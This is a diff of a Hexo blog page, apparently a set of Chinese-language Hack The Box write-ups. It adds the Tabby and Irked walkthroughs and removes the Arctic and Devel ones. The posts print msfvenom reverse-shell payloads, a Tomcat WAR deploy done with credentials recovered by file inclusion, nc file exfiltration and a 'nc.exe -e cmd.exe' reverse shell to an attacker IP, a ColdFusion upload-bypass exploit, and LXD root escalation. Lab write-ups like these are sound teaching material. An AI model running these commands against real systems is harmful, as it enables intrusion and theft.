@@ -71,6 +71,188 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-tabby" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/03/tabby/" class="article-date">
+  <time class="dt-published" datetime="2022-09-03T11:43:34.000Z" itemprop="datePublished">2022-09-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/09/03/tabby/">tabby</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/03/tabby/nmap.png">
+#### port explore
+22
+80:80是一个bootstrap themes搭起来的网站
+8080:8080是一个tomcat部署成功的默认界面,尝试了默认密码没有成功
+#### 目录扫描
+<img src="/2022/09/03/tabby/80.png">
+<img src="/2022/09/03/tabby/8080.png">
+先看80端口的readme表明是一个模板创建的，assets目录不允许访问，index.php/login好像也不能访问，80端口的news指向了一个megahosting.htb的域名，先将他的信息添加到/etc/hosts中，然后访问，得到一个信息是之前存在一个数据泄漏，但现在已经被移除了
+看8080端口的页面，一个manage需要登录
+#### get tomcat cred
+<img src="/2022/09/03/tabby/info.png">
+根据之前的提示，我们可以尝试文件包含，确认存在文件包含漏洞
+tomcat说users都被定义在/etc/tomcat9/tomcat-users.xml中
+但是没有内容，在搜索后得出tomcat9的配置文件有两个
+usr/share/tomcat9/etc/tomcat-users.xml是另一个配置文件存在的地方
+<img src="/2022/09/03/tabby/tomcat.png">
+得到用户名密码为tomcat-$3cureP4s5w0rd123!
+该用户能登录到host-manager界面
+rolename存在admin-gui和manager-script
+manager-scrript允许我们访问text-based web service located at /manager/text
+尝试访问/manager/text/list
+<img src="/2022/09/03/tabby/list.png">
+这样我们就拥有了部署war包的权限
+使用msfvenom生成一个war
+`msfvenom -p java/shell_reverse_tcp lhost=10.10.14.4 lport=8888 -f war -o rev.10.10.14.4-8888.war`
+传上去试一下
+`curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/abc --upload-file rev.10.10.14.14-8888.war`
+<img src="/2022/09/03/tabby/upload.png">
+访问文件触发,获得了tomcat的权限
+<img src="/2022/09/03/tabby/user.png">
+`python3 -c 'import pty;pty.spawn("bash")'`提升shell模式
+在/var/www/html/files中有一个所有者是ash的backup文件
+用nc把它拷到本地
+`
+cat 16162020_backup.zip | nc 10.10.14.4 9999
+nc -lvnp 9999 > 16162020_backup.zip
+`
+用zip2john创建这个zip的hash
+`zip2john 16162020_backup.zip -o 16162020_backup.zip.john`
+用john破解zip的密码
+<img src="/2022/09/03/tabby/zip.png">
+密码是admin@it
+切换到ash
+<img src="/2022/09/03/tabby/userflag.png">
+#### root
+先尝试sudo -l,发现没有
+传一个linenum.sh上去
+<img src="/2022/09/03/tabby/id.png">
+adm 权限可以读取log files
+#### lxd提权
+创建一个容器挂载到root下面，然后就能够获得root的权限
+<img src="/2022/09/03/tabby/lxclist.png">
+目前该机器上并没有挂载容器
+先下载一个container到本机
+(LXD Alpina Linux image builder)[https://github.com/saghul/lxd-alpine-builder.git]
+这个工具创建了一个LXD Alpina Linux container image 
+把生成的tar.gz传到靶机
+接下来将该镜像导入lxc
+`lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias abcimage`
+`lxd init`
+`lxc init abcimage abccontainer -c security.privileged=true`
+`lxc config device add abccontainer abcdevice disk source=/ path=/mnt/root recursive=true`
+<img src="/2022/09/03/tabby/list2.png">
+`lxc start abccontainer`
+<img src="/2022/09/03/tabby/list3.png">
+`lxc exec abccontainer /bin/sh`
+<img src="/2022/09/03/tabby/root.png">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/03/tabby/" data-id="cl7lzagut00001ecp6mq26uen" data-title="tabby" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-irked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/03/irked/" class="article-date">
+  <time class="dt-published" datetime="2022-09-03T05:54:07.000Z" itemprop="datePublished">2022-09-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/09/03/irked/">irked</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/03/irked/nmap.png">
+#### port explore
+22端口需要登录
+80端口是一张图片
+111端口可能是rpc服务
+剩下的端口不知道干什么的
+#### 目录扫描
+<img src="/2022/09/03/irked/dir.png">
+扫到一个apache的手动目录
+#### exploits
+searchsploit高端口的unrealircd,会发现几个可以利用的版本
+直接去github上找一个同样的py脚本
+<img src="/2022/09/03/irked/user.png">
+查找user.txt发现在另一个使用者目录下，但是我们现在没有权限
+#### shell as djmardov
+在documents目录下存在一个.backup
+<img src="/2022/09/03/irked/bak.png">
+先下载一个大图
+steghide(命令行下的steg工具)
+`
+extract - 提取数据
+-sf irked.jpg - 抽取数据的目标
+-p - 密码
+`
+得到一个密码
+<img src="/2022/09/03/irked/pass.png">
+试着用这个密码登录到djmardov
+成功切换到该用户
+#### shell as root
+用ssh连接刚才的用户登录到目标机器
+传一个linenum.sh到上面
+在suid的文件中，有一个viewuser没见过
+<img src="/2022/09/03/irked/viewuser.png">
+测试一下往/tmp/listusers里面echo id
+<img src="/2022/09/03/irked/id.png">
+命令能够成功执行
+echo sh > /etc/listusers
+<img src="/2022/09/03/irked/root.png">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/03/irked/" data-id="cl7ljp8uh0000m7cpcfvf5u8u" data-title="irked" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-bounty" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/09/02/bounty/" class="article-date">
@@ -648,140 +830,6 @@ upload目前不允许访问
 
 
   
-    <article id="post-Arctic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/08/29/Arctic/" class="article-date">
-  <time class="dt-published" datetime="2022-08-29T04:59:10.000Z" itemprop="datePublished">2022-08-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/08/29/Arctic/">Arctic</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/29/Arctic/nmap1.png">
-<img src="/2022/08/29/Arctic/nmap2.png">
-#### port 135
-#### port 8500
-web访问8500端口，可以看到一个目录结构，在http://10.10.10.11:8500/CFIDE/administrator/该目录下能看到一个登陆界面，且用户名是admin
-该登陆界面显示为adobe coldfusion 8
-<img src="/2022/08/29/Arctic/85001.png">
-在源码中可以看到密码上需要加密的，有一个salt
-<img src="/2022/08/29/Arctic/85002.png">
-<img src="/2022/08/29/Arctic/burp.png">
-#### get web shell
-搜索coldfusion可以找到几个可利用的文件
-<img src="/2022/08/29/Arctic/cold.png">
-看到一个可以通过msf进行文件上传的version8的漏洞利用
-直接利用显示失败
-查看该利用的源码
-在利用阶段该脚本首先上传一个文件到/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
-然后通过访问触发该文件
-于是我们可以自己制作一个jspshell并上传
-`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f raw > shell.jsp`
-`curl -X POST -F newfile=@shell.jsp 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00`
-在传完了以后在根目录下会出现一个新的文件夹userfiles
-<img src="/2022/08/29/Arctic/web.png">
-但是该目录下并不存在刚刚上传的文件
-说明上传时触发了防御机制
-MSF脚本中上传的是txt文件，且将上传类型改为了application/x-java-archive
-`curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/abc.jsp%00'`
-<img src="/2022/08/29/Arctic/web2.png">
-可以看到这次已经上传成功了
-开一个nc监听8888端口，并访问触发该脚本
-<img src="/2022/08/29/Arctic/nc1.png">
-拿到shell权限后使用systeminfo和windows-exploit-suggester
-<img src="/2022/08/29/Arctic/shell1.png">
-用ms10-059
-用smbserver传一个MS10-059.exe到目标机器的programdata
-开一个nc监听新的端口
-<img src="/2022/08/29/Arctic/root.png">
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/29/Arctic/" data-id="cl7edtt3w0000jtcpczmx23a7" data-title="Arctic" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Devel" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/08/28/Devel/" class="article-date">
-  <time class="dt-published" datetime="2022-08-29T01:43:37.000Z" itemprop="datePublished">2022-08-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/08/28/Devel/">Devel</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><p>nmap -p- –min-rate 10000  10.10.10.5<br><img src="/2022/08/28/Devel/nmap1.png"><br>详细扫描21,80端口<br><img src="/2022/08/28/Devel/nmap2.png"><br>发现21端口可以进行匿名登录</p>
-<h4 id="21-port"><a href="#21-port" class="headerlink" title="21 port"></a>21 port</h4><p>ftp 10.10.10.5<br><img src="/2022/08/28/Devel/ftp1.png"><br>该网站下存在一个htm页面和一个welcome的png</p>
-<h4 id="80-port"><a href="#80-port" class="headerlink" title="80 port"></a>80 port</h4><p>80端口的默认界面是一个IIS7默认界面<br>使用dirsearch进行目录扫描<br><img src="/2022/08/28/Devel/dirsearch.png"><br>有一个aspnet_client,但是禁止访问了<br><img src="/2022/08/28/Devel/request.png"><br>请求头表示这是一个ASP.NET</p>
-<h4 id="shell-as-a-web"><a href="#shell-as-a-web" class="headerlink" title="shell as a web"></a>shell as a web</h4><p>尝试用ftp往上面传一个shell(cmd.aspx)<br><img src="/2022/08/28/Devel/ftp2.png"><br>尝试访问这个界面<br><img src="/2022/08/28/Devel/web1.png"><br><img src="/2022/08/28/Devel/web2.png"><br>本地kali开启smbserver<br><img src="/2022/08/28/Devel/smb.png"><br>共享当前文件夹并在该文件夹里面放一个nc.exe<br>在传到网站上的webshell中执行反弹程序<br><code>\\10.10.14.2\share\nc.exe -e cmd.exe 10.10.14.2 4444</code><br>并在本地开启nc进行监听，能收到反弹的shell<br><img src="/2022/08/28/Devel/webshell.png"><br>该权限是网站权限所有的user目录都不能访问</p>
-<h4 id="shell-as-root"><a href="#shell-as-root" class="headerlink" title="shell as root"></a>shell as root</h4><img src="/2022/08/28/Devel/systeminfo.png">
-查看系统信息
-<img src="/2022/08/28/Devel/windows-exploit-suggester.png">
-发现有多个可以利用的漏洞
-一个github上面有很多已经编译过的exe利用程序
-[https://github.com/abatchy17/WindowsExploits]()
-用ms11-011失败
-用ms11-046成功
-#### shell with msf
-用msfvenom 制作一个aspx上传到服务器上
-`msfvenom -p wimdows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=8888 -f shell.aspx`
-<img src="/2022/08/28/Devel/meter.png">
-<img src="/2022/08/28/Devel/meter2.png">
-<img src="/2022/08/28/Devel/meter3.png">
-<img src="/2022/08/28/Devel/meter4.png">
-<img src="/2022/08/28/Devel/meter5.png">
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/28/Devel/" data-id="cl7edtt450003jtcp8iiw3r03" data-title="Devel" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -805,7 +853,7 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
     </div>
   </div>
 
@@ -818,6 +866,14 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
       <ul>
         
           <li>
+            <a href="/2024/12/11/Love/">Love</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/10/solidstate/">solidstate</a>
+          </li>
+        
+          <li>
             <a href="/2022/09/07/nineveh/">nineveh</a>
           </li>
         
@@ -827,14 +883,6 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
         
           <li>
             <a href="/2022/09/06/cronos/">cronos</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/06/bastard/">bastard</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/05/popcorn/">popcorn</a>
           </li>
         
       </ul>
@@ -850,7 +898,7 @@ MSF脚本中上传的是txt文件，且将上传类型改为了application/x-jav
   <div class="outer">
     <div id="footer-info" class="inner">
       
-      &copy; 2022 John Doe<br>
+      &copy; 2024 John Doe<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
